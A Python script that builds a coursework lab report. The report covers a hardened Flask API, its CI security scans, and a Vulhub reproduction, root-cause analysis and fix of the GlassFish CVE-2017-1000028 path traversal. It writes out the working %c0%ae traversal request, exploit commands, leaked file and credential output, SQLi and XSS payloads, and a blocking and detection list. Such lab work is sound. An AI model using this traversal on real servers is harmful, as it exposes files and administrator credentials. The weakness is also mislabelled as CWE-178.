"""Generate the Work 1 report as a .docx file."""

import os

from docx import Document
from docx.enum.text import WD_ALIGN_PARAGRAPH, WD_BREAK
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Pt, RGBColor, Inches

OUT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "docs")
OUT_FILE = os.path.join(OUT_DIR, "Work1_Report_SONG_Kongliang_23320316.docx")


def build() -> Document:
    doc = Document()

    style = doc.styles["Normal"]
    style.font.name = "Calibri"
    style.font.size = Pt(11)

    section = doc.sections[0]
    section.page_width = Inches(8.27)   # A4
    section.page_height = Inches(11.69)
    section.left_margin = Inches(1.0)
    section.right_margin = Inches(1.0)
    section.top_margin = Inches(1.0)
    section.bottom_margin = Inches(1.0)

    return doc


def title_page(doc: Document) -> None:
    def center(text, size, bold=False, space_after=6, color=None, italic=False):
        paragraph = doc.add_paragraph()
        paragraph.alignment = WD_ALIGN_PARAGRAPH.CENTER
        paragraph.paragraph_format.space_after = Pt(space_after)
        run = paragraph.add_run(text)
        run.font.size = Pt(size)
        run.bold = bold
        run.italic = italic
        if color:
            run.font.color.rgb = color
        return paragraph

    center("", 12, space_after=60)
    center("HANGZHOU DIANZI UNIVERSITY", 13, bold=True, space_after=4)
    center("Information Security Course", 12, space_after=60)

    center("LABORATORY WORK No. 1", 18, bold=True, space_after=10)
    center(
        "Secure REST API Development with CI/CD\nand Real CVE Vulnerability Analysis",
        14,
        bold=True,
        space_after=40,
    )

    center("Variant No. 1", 12, space_after=4)
    center(
        "CVE-2017-1000028 — GlassFish 4.1 Admin Console\nPath Traversal / Arbitrary File Read",
        11,
        italic=True,
        space_after=70,
    )

    center("Performed by: SONG Kongliang (宋孔亮)", 12, space_after=6)
    center("HDU number: 23320316", 12, space_after=70)

    center("Repository: <public GitHub/GitLab URL>", 10, space_after=4)
    center("Pipeline run: <Actions run URL>", 10, space_after=4)
    center("Date: October 2026", 10)

    doc.add_paragraph().add_run().add_break(WD_BREAK.PAGE)


def heading(doc: Document, text: str, level: int = 1) -> None:
    paragraph = doc.add_heading(text, level=level)
    for run in paragraph.runs:
        run.font.color.rgb = RGBColor(0x1F, 0x38, 0x64)
        run.font.name = "Calibri"


def para(doc: Document, text: str, bullet: bool = False, space_after=6) -> None:
    paragraph = doc.add_paragraph(style="List Bullet" if bullet else None)
    paragraph.paragraph_format.space_after = Pt(space_after)
    paragraph.add_run(text)


def code(doc: Document, lines: list[str]) -> None:
    for line in lines:
        paragraph = doc.add_paragraph()
        paragraph.paragraph_format.space_after = Pt(0)
        paragraph.paragraph_format.space_before = Pt(0)
        paragraph.paragraph_format.left_indent = Inches(0.25)
        run = paragraph.add_run(line if line else " ")
        run.font.name = "Consolas"
        run.font.size = Pt(9)
    doc.add_paragraph().paragraph_format.space_after = Pt(4)


def table(doc: Document, header: list[str], rows: list[list[str]], widths=None) -> None:
    grid = doc.add_table(rows=1, cols=len(header))
    grid.style = "Table Grid"
    header_cells = grid.rows[0].cells
    for index, text in enumerate(header):
        header_cells[index].text = ""
        run = header_cells[index].paragraphs[0].add_run(text)
        run.bold = True
        run.font.size = Pt(10)
        shade(header_cells[index], "D9E2F3")

    for row in rows:
        cells = grid.add_row().cells
        for index, text in enumerate(row):
            cells[index].text = ""
            run = cells[index].paragraphs[0].add_run(text)
            run.font.size = Pt(10)

    if widths:
        for row in grid.rows:
            for index, width in enumerate(widths):
                row.cells[index].width = Inches(width)
    doc.add_paragraph().paragraph_format.space_after = Pt(4)


def shade(cell, fill: str) -> None:
    tc_pr = cell._tc.get_or_add_tcPr()
    shd = OxmlElement("w:shd")
    shd.set(qn("w:val"), "clear")
    shd.set(qn("w:fill"), fill)
    tc_pr.append(shd)


def note(doc: Document, text: str) -> None:
    paragraph = doc.add_paragraph()
    paragraph.paragraph_format.space_after = Pt(8)
    run = paragraph.add_run(text)
    run.italic = True
    run.font.size = Pt(10)
    run.font.color.rgb = RGBColor(0x59, 0x59, 0x59)


def main() -> None:
    doc = build()
    title_page(doc)

    # ---------------------------------------------------------------- 1
    heading(doc, "1. Purpose of the Work", 1)
    para(
        doc,
        "The purpose of this laboratory work is to gain practical experience in building "
        "a secure backend application with automated vulnerability checking, and in "
        "analysing and remediating a real-world vulnerability in a controlled environment. "
        "The work covers the full security lifecycle: designing protection against the "
        "OWASP Top 10, integrating security tools into a CI/CD pipeline, reproducing a "
        "known CVE with Vulhub, identifying its root cause, applying a fix and verifying "
        "that the attack no longer succeeds while the application still works.",
        space_after=8,
    )

    # ---------------------------------------------------------------- 2
    heading(doc, "2. Stack and Project Initialisation", 1)
    table(
        doc,
        ["Choice", "Value"],
        [
            ["Language / framework", "Python 3.11 + Flask 3"],
            ["Database", "SQLite via Flask-SQLAlchemy (ORM)"],
            ["Authentication", "JWT (PyJWT, HS256) + bcrypt password hashing"],
            ["Package manager", "pip (requirements.txt, requirements-dev.txt)"],
            ["VCS / CI", "Git + GitHub Actions"],
            ["SAST", "Bandit"],
            ["SCA", "pip-audit"],
            ["CVE lab", "Docker 29.9.1 + Compose v5.6.0 (Vulhub: glassfish/CVE-2017-1000028)"],
        ],
        widths=[2.0, 4.3],
    )
    para(
        doc,
        "The project was initialised with a package manager, a git repository was created "
        "and linked to a remote repository; every push and pull request triggers the "
        "pipeline described in section 5.",
    )

    # ---------------------------------------------------------------- 3
    heading(doc, "3. Functional API", 1)
    table(
        doc,
        ["Method", "Endpoint", "Auth", "Description"],
        [
            ["POST", "/auth/login", "no", "Authenticates a user, returns a signed JWT"],
            ["GET", "/api/data", "JWT", "Returns the list of registered users"],
            ["POST", "/api/posts", "JWT", "Creates a post (own-choice endpoint)"],
            ["GET", "/api/posts?q=", "JWT", "Parameterised search over posts"],
            ["GET", "/api/me", "JWT", "Returns the caller's identity from the JWT claims"],
            ["GET", "/health", "no", "Liveness probe"],
        ],
        widths=[0.8, 1.6, 0.7, 3.2],
    )
    para(doc, "Demo accounts created at first start (passwords stored only as bcrypt hashes): "
              "alice / Str0ng!Passw0rd#2024 (user), bob (user), admin / Adm1n!Passw0rd#2024 (admin).")

    heading(doc, "3.1 Example requests and observed responses", 2)
    code(
        doc,
        [
            "$ curl -i -X POST http://127.0.0.1:5000/auth/login -H \"Content-Type: application/json\" \\",
            "       -d '{\"username\":\"alice\",\"password\":\"Str0ng!Passw0rd#2024\"}'",
            "HTTP/1.1 200 OK",
            "{",
            "  \"access_token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIx...\",",
            "  \"token_type\": \"Bearer\",",
            "  \"expires_in\": 1800",
            "}",
            "",
            "$ curl -i http://127.0.0.1:5000/api/data",
            "HTTP/1.1 401 Unauthorized",
            "{ \"error\": \"Missing or malformed Authorization header\" }",
            "",
            "$ curl -i http://127.0.0.1:5000/api/data -H \"Authorization: Bearer $TOKEN\"",
            "HTTP/1.1 200 OK",
            "{ \"count\": 3, \"data\": [ {\"id\":1,\"username\":\"alice\",\"role\":\"user\"}, ... ] }",
        ],
    )
    note(doc, "Full transcript: docs/api-demo-output.txt (produced by scripts/api_smoke_test.py). "
              "A Postman collection is provided in postman/work1-api.postman_collection.json.")

    # ---------------------------------------------------------------- 4
    heading(doc, "4. Implemented Security Measures", 1)

    heading(doc, "4.1 Protection against SQL injection (OWASP A03)", 2)
    para(doc, "All database access goes through the SQLAlchemy ORM / Core select() construct, "
              "so values are always passed as bound parameters and never concatenated into a "
              "SQL string.", bullet=True)
    code(
        doc,
        [
            "# app/routes.py",
            "stmt = select(User).where(User.username == username)      # bound parameter",
            "stmt = stmt.where(Post.content.ilike(f\"%{query}%\"))       # bound parameter",
        ],
    )
    para(doc, "No raw SQL string is built anywhere in the project; there is no "
              "db.engine.execute(\"SELECT ... \") call.", bullet=True)
    para(doc, "Automated proof: test_sql_injection_payload_is_not_executed and "
              "test_posts_search_is_parameterised — the payload ' OR '1'='1' -- returns 401 / 0 "
              "results instead of dumping rows.", bullet=True)

    heading(doc, "4.2 Protection against XSS (OWASP A03)", 2)
    para(doc, "Every user-controlled value is escaped on output with markupsafe.escape() "
              "(app/security.py::sanitize) before serialisation, so <script> becomes "
              "&lt;script&gt;.", bullet=True)
    code(
        doc,
        [
            "POST /api/posts  {\"title\":\"<img src=x onerror=alert(1)>\",",
            "                  \"content\":\"<script>alert('xss')</script>\"}",
            "HTTP/1.1 201 Created",
            "\"content\": \"&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;\"",
            "\"title\":   \"&lt;img src=x onerror=alert(1)&gt;\"",
        ],
    )
    para(doc, "Input is length-limited (title <= 120, content <= 4000 characters) and responses "
              "are strictly application/json.", bullet=True)
    para(doc, "Defence-in-depth headers on every response: Content-Security-Policy "
              "(default-src 'none'; frame-ancestors 'none'), X-Content-Type-Options: nosniff, "
              "X-Frame-Options: DENY, Referrer-Policy: no-referrer, Cache-Control: no-store, "
              "HSTS.", bullet=True)

    heading(doc, "4.3 Protection against Broken Authentication (OWASP A07)", 2)
    para(doc, "Password hashing: bcrypt with cost factor 12 and a random salt per password "
              "(app/security.py::hash_password). Plaintext passwords are never stored; a test "
              "asserts the stored value starts with $2b$.", bullet=True)
    para(doc, "JWT issuing: HS256, iss = work1-secure-api, iat/nbf/exp claims, 30-minute "
              "lifetime, signing key read from the JWT_SECRET environment variable (an ephemeral "
              "random key is generated if the variable is absent — no hard-coded secret).", bullet=True)
    para(doc, "Middleware: @token_required validates the Authorization: Bearer header on "
              "/api/data, /api/posts and /api/me — signature, issuer, expiry and required claims "
              "are checked, then the subject is re-loaded from the database with a parameterised "
              "query. Missing, malformed, tampered and expired tokens all produce 401.", bullet=True)
    para(doc, "No user enumeration: wrong password and unknown username return the same message, "
              "and the unknown-user path still performs a bcrypt comparison against a dummy hash "
              "so the response time does not reveal whether the account exists.", bullet=True)
    para(doc, "Passwords longer than 72 bytes are rejected (bcrypt limit); the Flask debugger is "
              "disabled in every environment.", bullet=True)

    # ---------------------------------------------------------------- 5
    heading(doc, "5. CI/CD Pipeline with Security Scanners", 1)
    para(doc, "File: .github/workflows/ci.yml — triggered on every push and on every pull request.")
    table(
        doc,
        ["Job", "Tool / type", "Command", "Quality gate"],
        [
            ["tests", "pytest", "pytest -v", "all 11 tests must pass"],
            ["sast", "Bandit (SAST)", "bandit -r app -ll -ii -f json -o bandit-report.json",
             "no medium/high finding"],
            ["sca", "pip-audit (SCA)", "pip-audit -r requirements.txt --strict --format json",
             "no vulnerable dependency"],
        ],
        widths=[0.8, 1.5, 2.7, 1.3],
    )
    para(doc, "Both scanners upload their JSON report as a workflow artifact; Bandit also "
              "publishes SARIF to the GitHub Security tab (codeql-action/upload-sarif).")

    heading(doc, "5.1 Scanner results", 2)
    code(
        doc,
        [
            "$ pytest -q",
            "11 passed, 12 warnings in 8.54s",
            "",
            "$ bandit -r app -ll -ii",
            "Test results:",
            "        No issues identified.",
            "Code scanned:",
            "        Total lines of code: 331",
            "        Total issues (by severity):  Undefined: 0   Low: 1   Medium: 0   High: 0",
            "",
            "$ pip-audit -r requirements.txt --strict",
            "No known vulnerabilities found",
        ],
    )
    note(doc, "The single Bandit low finding is B105 on the demo seed passwords in app/seed.py; it "
              "is annotated # nosec because those are teaching fixtures, and -ll filters low "
              "severity out of the gate.")
    note(doc, "[Screenshot] docs/screenshots/01-actions-green.png — Actions run with the three jobs "
              "green; 02-bandit-sast.png — Bandit step; 03-pip-audit-sca.png — pip-audit step; "
              "04-artifacts.png — uploaded reports.")

    heading(doc, "5.2 Automated tests", 2)
    para(doc, "tests/test_api.py contains 11 tests: JWT issuing, wrong password, unknown user "
              "(no enumeration), protected endpoint without token, with token, tampered token, "
              "expired token, SQL injection attempt, password stored hashed, XSS escaped on "
              "output, parameterised search.", space_after=8)

    # ---------------------------------------------------------------- 6
    heading(doc, "6. Selected CVE — CVE-2017-1000028", 1)
    para(doc, "This section was executed for real on the author's machine (Docker 29.9.1, "
              "Docker Compose v5.6.0). Every response quoted below is a verbatim capture stored "
              "in cve/CVE-2017-1000028/evidence/.")
    table(
        doc,
        ["Field", "Value"],
        [
            ["CVE ID", "CVE-2017-1000028"],
            ["Title", "GlassFish Server Open Source Edition — path traversal / arbitrary file "
                      "read in the administration console"],
            ["Affected", "GlassFish Server Open Source Edition 4.1 (administration console, "
                         "port 4848)"],
            ["Fixed in", "GlassFish 4.1.2 / 5.0 (strict URI decoding and path canonicalisation)"],
            ["Weakness", "CWE-22 Path Traversal, enabled by CWE-178 overlong (non shortest form) "
                         "UTF-8 decoding"],
            ["OWASP 2021", "A01 Broken Access Control (primary), A05 Security Misconfiguration, "
                           "A06 Vulnerable and Outdated Components"],
            ["CVSS v3", "7.5 High — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"],
            ["Impact", "Unauthenticated read of any file readable by the GlassFish process: "
                       "/etc/passwd, the admin-keyfile credential hash and /proc/self/environ, "
                       "which returns the administrator password in cleartext — leading to full "
                       "console takeover and, through application deployment, to remote code "
                       "execution"],
        ],
        widths=[1.3, 5.0],
    )

    heading(doc, "6.1 Preparing the vulnerable environment", 2)
    code(
        doc,
        [
            "$ cd cve/CVE-2017-1000028",
            "$ docker compose -f vulnerable/docker-compose.yml up -d",
            "[+] Container cve-2017-1000028-glassfish Started",
            "",
            "$ docker ps --format \"table {{.Names}}\\t{{.Ports}}\"",
            "NAMES                        PORTS",
            "cve-2017-1000028-glassfish   0.0.0.0:4848->4848/tcp, 0.0.0.0:5005->5005/tcp",
            "# image: vulhub/glassfish:4.1   4848 = admin console (TLS)   5005 = JDWP debugger",
        ],
    )
    para(doc, "Note: the administration console needs three to five minutes to initialise. Until "
              "it is ready every request returns HTTP 202 with the page “The Admin Console "
              "Adapter is not yet initialized”, and no file content is disclosed; the console was "
              "polled with curl -k https://127.0.0.1:4848/login.jsf until that page disappeared.")

    heading(doc, "6.2 Reproducing the attack", 2)
    para(doc, "The console serves static theme resources from /theme/META-INF/. Because the URI "
              "is percent-decoded with a lenient UTF-8 decoder, the illegal overlong sequence "
              "%c0%ae is decoded to '.', so %c0%ae%c0%ae/ becomes ../ and the request escapes the "
              "theme directory:")
    code(
        doc,
        [
            "GET /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",
            "    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1",
            "Host: 127.0.0.1:4848",
            "Connection: close",
        ],
    )
    para(doc, "Sending the request over plain HTTP shows that the traversal string reaches the "
              "routing layer intact — enable-secure-admin simply redirects it to TLS:")
    code(
        doc,
        [
            "HTTP/1.1 302 Found",
            "Location: https://127.0.0.1:4848/theme/META-INF/%c0%ae%c0%ae/.../etc/passwd",
        ],
    )
    para(doc, "Replaying the same request over TLS returns the file itself, with no credentials "
              "of any kind (capture: evidence/poc-etc-passwd.txt):")
    code(
        doc,
        [
            "$ python poc/exploit.py --target 127.0.0.1 --port 4848 --file /etc/passwd --https",
            "HTTP status : 200",
            "HTTP/1.1 200 OK",
            "Server: GlassFish Server Open Source Edition  4.1",
            "X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1 ...)",
            "Transfer-Encoding: chunked",
            "",
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
            "...",
            "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin",
            "",
            "[+] VULNERABLE - file content disclosed without authentication.",
        ],
    )
    para(doc, "The same request was then aimed at two far more damaging targets. Reading the "
              "credential file of the console returns the administrator's password hash "
              "(evidence/poc-admin-keyfile.txt):")
    code(
        doc,
        [
            "$ python poc/exploit.py --port 4848 --https \\",
            "    --file /usr/local/glassfish4/glassfish/domains/domain1/config/admin-keyfile",
            "HTTP status : 200",
            "admin;{SSHA256}z5q5cZWChstXsvY4mTLnitBUSyfpOgONr9kKQha5TM7bV6S5lvn5gQ==;asadmin",
        ],
    )
    para(doc, "And reading the process environment returns the administrator password in "
              "cleartext, because the container receives it as an environment variable "
              "(evidence/poc-environ.txt):")
    code(
        doc,
        [
            "$ python poc/exploit.py --port 4848 --file /proc/self/environ --https",
            "HTTP status : 200",
            "HOSTNAME=efffac7d467e HOME=/root JAVA_VERSION=8u342",
            "ADMIN_PASSWORD=vulhub_default_password",
            "GLASSFISH_HOME=/usr/local/glassfish4  JAVA_HOME=/usr/local/openjdk-8",
            "PATH=/usr/local/openjdk-8/bin:... PWD=/usr/local/glassfish4",
        ],
    )
    para(doc, "Post-exploitation: with admin / vulhub_default_password the attacker logs in to "
              "https://127.0.0.1:4848 as administrator. On a Java EE container that is equivalent "
              "to owning the server, because the console can deploy applications and a deployed "
              "application runs with the privileges of the GlassFish process — here root. The "
              "exposed JDWP port 5005 gives an even more direct path to code execution.")
    note(doc, "[Screenshot] evidence/01-container-running.png, 02-console-login.png, "
              "03-poc-etc-passwd.png, 04-poc-environ.png. "
              "One-shot scripts: poc/reproduce.sh and poc/reproduce.ps1. A raw-socket PoC is used "
              "on purpose: high level clients and the Windows cmd shell mangle the %c0%ae bytes.")

    heading(doc, "6.3 Root cause analysis", 2)
    para(doc, "The administration console maps a request URI onto a file inside the theme "
              "directory (/theme/META-INF/ — the login page itself loads /theme/META-INF/"
              "dojo/dojo.js and /theme/META-INF/json/json.js). That mapping performs the required "
              "steps in the wrong order.")
    heading(doc, "6.3.1 Lenient decoding of overlong UTF-8 (CWE-178)", 3)
    para(doc, "UTF-8 requires every code point to be encoded in its shortest possible form. The "
              "character '.' (U+002E) is the single byte 0x2E, but it can also be written with the "
              "illegal two byte overlong sequence 0xC0 0xAE. A strict decoder rejects it; the "
              "lenient decoder used here accepts it and yields '.':")
    code(
        doc,
        [
            "%c0%ae   ->  bytes C0 AE  ->  (lenient decode)  ->  '.'      U+002E",
            "%c0%af   ->  bytes C0 AF  ->  (lenient decode)  ->  '/'      U+002F",
        ],
    )
    para(doc, "The traversal therefore only appears AFTER decoding. Any defence that inspects the "
              "raw URI for '..' sees nothing suspicious at all — this is what makes the "
              "vulnerability easy to miss and what defeats naive blacklist filters.")
    heading(doc, "6.3.2 Missing canonicalisation and base-directory check (CWE-22)", 3)
    para(doc, "Once decoded, the path is never passed through normalize() / getCanonicalPath(), "
              "so the .. segments survive all the way to the file lookup, and the result is never "
              "checked against the theme root directory. The correct pattern is:")
    code(
        doc,
        [
            "// SAFE pattern (what GlassFish 4.1 does NOT do)",
            "String decoded = strictPercentDecode(uri);            // reject overlong forms",
            "Path canonical = new File(BASE_DIR, decoded).getCanonicalPath().normalize();",
            "if (!canonical.startsWith(BASE_DIR)) { return 403; }  // base-directory check",
            "serve(canonical);",
        ],
    )
    para(doc, "Two conditions turn the coding defect into a critical vulnerability:")
    para(doc, "The theme resource handler is reachable BEFORE authentication, so this is an "
              "unauthenticated file read rather than a privilege escalation — any client that can "
              "reach TCP/4848 can use it.", bullet=True)
    para(doc, "The GlassFish process runs as root in the container, so “any file the process can "
              "read” means every file, including /proc/self/environ, which exposes the "
              "administrator password injected as an environment variable.", bullet=True)
    para(doc, "It is therefore a canonicalisation / decoding defect, not an injection or a "
              "memory-corruption bug. The upstream fix makes URI decoding strict and canonicalises "
              "and validates the path before opening the file, so the traversal is rejected before "
              "any file is touched.")

    heading(doc, "6.4 Applied fix", 2)
    table(
        doc,
        ["#", "Change", "Type", "File"],
        [
            ["1", "Upgrade to GlassFish >= 4.1.2 / 5.0: strict URI decoding, canonicalise and "
                  "validate the path before opening the file",
             "Primary fix (removes the cause)", "documented in README.md §6.1"],
            ["2", "Administration console no longer published to the host: reachable only on the "
                  "internal docker network", "Exposure reduction", "fixed/docker-compose.yml"],
            ["3", "JDWP debug port 5005 removed entirely (a Java debugger port is remote code "
                  "execution by design)", "Exposure reduction", "fixed/docker-compose.yml"],
            ["4", "Reverse proxy rejects overlong UTF-8 (%c0, %e0, %f0, %f8, %fc) and traversal "
                  "sequences (../, %2e%2e, %252e)", "Defence in depth", "fixed/nginx.conf"],
            ["5", "Proxy bound to 127.0.0.1 only", "Exposure reduction", "fixed/docker-compose.yml"],
            ["6", "Backend version banners hidden (Server, X-Powered-By)", "Information leakage",
             "fixed/nginx.conf"],
            ["7", "Administrator password externalised to .env instead of hard-coded",
             "Credential hardening", "fixed/.env.example"],
        ],
        widths=[0.3, 2.7, 1.5, 1.8],
    )
    para(doc, "Measure 1 removes the cause — the lenient decoder and the missing "
              "canonicalisation — rather than hiding the symptom. Measures 2-7 do not change the "
              "affected code but shrink the attack surface and the blast radius and add "
              "detection: the standard defence-in-depth approach. It must be stressed that the "
              "reverse proxy alone is NOT a fix; it is a compensating control that only buys time "
              "until the upgrade can be deployed. Operationally, the administrator password and "
              "every secret present in the container environment must be rotated on any instance "
              "that was ever reachable from an untrusted network.")

    heading(doc, "6.5 Verification of the fix and regression testing", 2)
    para(doc, "The hardened stack was started next to the vulnerable one and the identical attack "
              "was replayed against it:")
    code(
        doc,
        [
            "$ cd fixed && cp .env.example .env && docker compose up -d",
            "NAMES                                 PORTS",
            "cve-2017-1000028-proxy                127.0.0.1:8080->80/tcp",
            "cve-2017-1000028-glassfish-hardened   4848/tcp          # no published port",
            "",
            "$ python poc/exploit.py --port 8080 --file /etc/passwd",
            "HTTP status : 403",
            "HTTP/1.1 403 Forbidden",
            "Server: nginx",
            "",
            "<center><h1>403 Forbidden</h1></center>",
        ],
    )
    para(doc, "A dedicated regression script then runs three checks in one pass "
              "(poc/verify_fix.py): the exploit must still work against the untouched container, "
              "it must be blocked by the hardened one, and the console must remain usable. Real "
              "output (evidence/verify-fix.txt):")
    code(
        doc,
        [
            "$ python poc/verify_fix.py",
            "==============================================================================",
            "CVE-2017-1000028 - fix verification (vulnerable vs hardened)",
            "==============================================================================",
            "[PASS] A. vulnerable env: exploit works           HTTP 200, /etc/passwd marker=yes",
            "[PASS] B. hardened env: exploit blocked           HTTP 403, /etc/passwd marker=no",
            "[PASS] C. hardened env: console still usable      HTTP 302 -> http://127.0.0.1/login.jsf",
            "------------------------------------------------------------------------------",
            "RESULT: ALL CHECKS PASSED",
        ],
    )
    para(doc, "Check A is the control group — it proves the exploit path is still valid, so the "
              "403 in check B is meaningful rather than the result of a broken request. Check B "
              "proves the mitigation works. Check C proves the console was not simply switched "
              "off: availability is a security objective too, and a “fix” that breaks the service "
              "would be rejected in production.")
    note(doc, "[Screenshot] evidence/05-fixed-403.png (403) and evidence/06-verify-fix.png "
              "(all checks passed).")

    # ---------------------------------------------------------------- 7
    heading(doc, "7. Answers to the Control Questions", 1)

    questions = [
        ("Why is password hashing with bcrypt preferable to using SHA-256?",
         "SHA-256 is a general-purpose cryptographic hash designed to be extremely fast, which is "
         "exactly what an attacker wants: with GPUs an attacker can test billions of SHA-256 "
         "candidates per second, and pre-computed rainbow tables cover unsalted hashes. bcrypt is "
         "a password-based key derivation function: it embeds a random per-password salt (so "
         "rainbow tables are useless), it is deliberately slow and its cost factor can be "
         "increased as hardware improves, and it is memory-hard enough to make parallel GPU/ASIC "
         "attacks far less efficient. A single bcrypt check costs ~100 ms at cost 12 instead of "
         "microseconds, which turns an offline cracking attack from hours into years."),
        ("What is the main difference between SAST and DAST?",
         "SAST (static) analyses source code or bytecode without running the application — white "
         "box, early in the lifecycle, points at the exact line, but cannot see runtime behaviour, "
         "configuration or authentication issues and produces false positives. DAST (dynamic) "
         "tests the running application from the outside like an attacker — black box, "
         "language-independent, finds runtime, configuration and server-side problems, but cannot "
         "show the faulty line and its coverage depends on how well it crawls the application. "
         "They are complementary: this work uses SAST (Bandit) in the pipeline; Work 2 uses DAST "
         "(OWASP ZAP)."),
        ("How does a JWT work?",
         "A JWT is three Base64URL segments: header (algorithm and type), payload (claims: sub, "
         "iat, nbf, exp, iss, and here also username/role) and signature. The signature is "
         "HMAC-SHA256(header.payload, secret) for HS256, or an RSA/ECDSA signature for asymmetric "
         "algorithms. The server verifies the token by recomputing/validating that signature with "
         "its secret (or public key) and then checking the claims — issuer, not-before, expiry and "
         "required claims — so no session lookup is needed. Important: Base64URL is encoding, not "
         "encryption, so no secret should be placed in the payload; also the algorithm must be "
         "pinned (never trust the header's alg, to avoid alg=none or algorithm-confusion attacks)."),
        ("What are the risks of not auditing third-party dependencies?",
         "Applications are mostly third-party code: a vulnerable library is a vulnerable "
         "application (Log4Shell is the classic example). Without SCA you cannot answer “are we "
         "affected?” when a new CVE is published, you keep outdated and unmaintained components, "
         "you are exposed to supply-chain attacks (typosquatting, hijacked maintainer accounts, "
         "malicious releases), and you may violate licence obligations. Continuous dependency "
         "auditing (pip-audit, Snyk, OWASP Dependency-Check) plus pinned, regularly updated "
         "versions is the control."),
        ("Why Docker and Vulhub instead of installing vulnerable software on the host?",
         "Containers give isolation (a deliberately vulnerable service cannot damage the host), "
         "reproducibility (the exact vulnerable version and configuration are pinned in "
         "docker-compose.yml, identical for everyone), speed (one command up, one command "
         "destroyed), safety (the lab can be kept on localhost or an internal network, so nothing "
         "dangerous is exposed) and ethics/legality (a disposable personal lab instead of "
         "attacking real systems)."),
        ("What is the difference between a vulnerability and an exploit?",
         "A vulnerability is a weakness or flaw in the design, implementation or configuration of "
         "a system (here: the lenient overlong-UTF-8 decoding and the missing path "
         "canonicalisation in the GlassFish console). An exploit is the concrete technique or "
         "code that takes advantage of that weakness (here: the single unauthenticated GET "
         "request carrying %c0%ae%c0%ae/ traversal segments, implemented in poc/exploit.py). In "
         "this work I reproduced the exploit against the vulnerable build in order to demonstrate "
         "the vulnerability, then verified that the hardened build no longer yields the file."),
        ("Why is regression testing after a patch critically important?",
         "A patch changes the system: a version upgrade may alter APIs, default configuration or "
         "behaviour, and a code change may break a legitimate feature. If only the attack is "
         "re-tested, a “secure” but unusable service can be shipped — availability is a security "
         "objective too. Regression testing (here: check C of poc/verify_fix.py, which asserts "
         "that the console still answers and serves /login.jsf) proves that the fix removed the "
         "vulnerability without damaging the main functionality."),
        ("How does being able to reproduce known CVEs help a security specialist?",
         "For a pentester it turns a scanner finding into proof of real exploitability, removes "
         "false positives, shows the actual impact and lets findings be prioritised by realistic "
         "risk. For a SOC analyst it reveals exactly what an attack looks like on the wire — the "
         "URL, method, headers and response — which is what detection rules, SIEM queries and "
         "threat-hunting hypotheses are built from (for example: alert on any URI containing "
         "%c0%ae, %c0%af or %2e%2e, and on any request for /proc/self/environ or "
         ".../config/admin-keyfile). It also speeds up incident response, because the analyst "
         "already knows the prerequisites, the blast radius and the remediation steps."),
    ]
    for index, (question, answer) in enumerate(questions, start=1):
        paragraph = doc.add_paragraph()
        paragraph.paragraph_format.space_after = Pt(2)
        run = paragraph.add_run(f"Q{index}. {question}")
        run.bold = True
        run.font.size = Pt(11)
        para(doc, answer, space_after=8)

    # ---------------------------------------------------------------- 8
    heading(doc, "8. Conclusion", 1)
    para(doc, "A small REST API was built with parameterised database access, output escaping and "
              "JWT authentication on top of bcrypt password hashing, and wired into a GitHub "
              "Actions pipeline that runs unit tests, Bandit (SAST) and pip-audit (SCA) on every "
              "push; all checks pass and no medium/high issue was found. The CVE part reproduced "
              "CVE-2017-1000028 for real in a disposable GlassFish 4.1 container: a single "
              "unauthenticated GET request whose URI carries the overlong UTF-8 sequence %c0%ae "
              "disclosed /etc/passwd, the console credential hash and — through /proc/self/environ "
              "— the administrator password in cleartext. The root cause is a canonicalisation "
              "defect rather than an injection bug: the URI is decoded leniently and the decoded "
              "path is neither canonicalised nor re-checked against the theme directory. The fix "
              "removes that cause by upgrading to a release with strict URI decoding, supported by "
              "defence in depth (no published admin port, no JDWP debugger, an nginx filter for "
              "overlong encodings, localhost binding, externalised credentials). A regression run "
              "confirmed all three checks: the exploit still works against the untouched "
              "container, it is blocked with 403 by the hardened one, and the console keeps "
              "serving traffic. The main lesson is that a defect as small as “decode before you "
              "validate” can hand an anonymous attacker the administrator password, that a reverse "
              "proxy is a compensating control and never a substitute for the upgrade, and that "
              "automated scanning and hands-on CVE analysis are complementary: neither alone would "
              "have surfaced this.")

    # ---------------------------------------------------------------- 9
    heading(doc, "9. References", 1)
    for reference in [
        "OWASP Top 10 — https://owasp.org/www-project-top-ten/",
        "OWASP Cheat Sheet Series — https://cheatsheetseries.owasp.org/",
        "JWT introduction — https://jwt.io/introduction",
        "GitHub Actions documentation — https://docs.github.com/en/actions",
        "Vulhub — https://github.com/vulhub/vulhub (glassfish/CVE-2017-1000028)",
        "NVD entry for CVE-2017-1000028 — https://nvd.nist.gov/vuln/detail/CVE-2017-1000028",
        "CWE-22 Improper Limitation of a Pathname to a Restricted Directory — "
        "https://cwe.mitre.org/data/definitions/22.html",
        "CWE-178 Improper Handling of Case Sensitivity / overlong UTF-8 — "
        "https://cwe.mitre.org/data/definitions/178.html",
        "Docker documentation — https://docs.docker.com/",
        "Bandit documentation — https://bandit.readthedocs.io/",
        "pip-audit — https://pypi.org/project/pip-audit/",
    ]:
        para(doc, reference, bullet=True, space_after=2)

    note(doc, "Ethics: the CVE was reproduced exclusively in a disposable localhost Docker lab "
              "built from Vulhub for this coursework; no third-party system was targeted.")

    os.makedirs(OUT_DIR, exist_ok=True)
    doc.save(OUT_FILE)
    print(f"Report written to {OUT_FILE}")


if __name__ == "__main__":
    main()
